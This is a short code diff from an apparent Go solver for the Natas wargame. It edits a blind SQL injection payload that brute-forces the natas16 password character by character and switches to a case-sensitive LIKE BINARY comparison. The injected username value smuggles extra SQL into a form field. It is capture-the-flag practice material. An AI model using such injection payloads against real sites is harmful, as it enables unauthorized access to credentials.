@@ -19,7 +19,8 @@ func doBruteforce(prefix string) string {
 
 		password := prefix + string(charset[c])
 		form_data := url.Values{
-			"username": []string{"natas16\" AND password LIKE \"" + password + "%"},
+			// "username": []string{"natas16\" AND password LIKE \"" + password + "%"},
+			"username": []string{"natas16\" AND password LIKE BINARY \"" + password + "%\" \""},
 		}
 
 		request, _ := http.NewRequest("POST", base_url, strings.NewReader(form_data.Encode()))
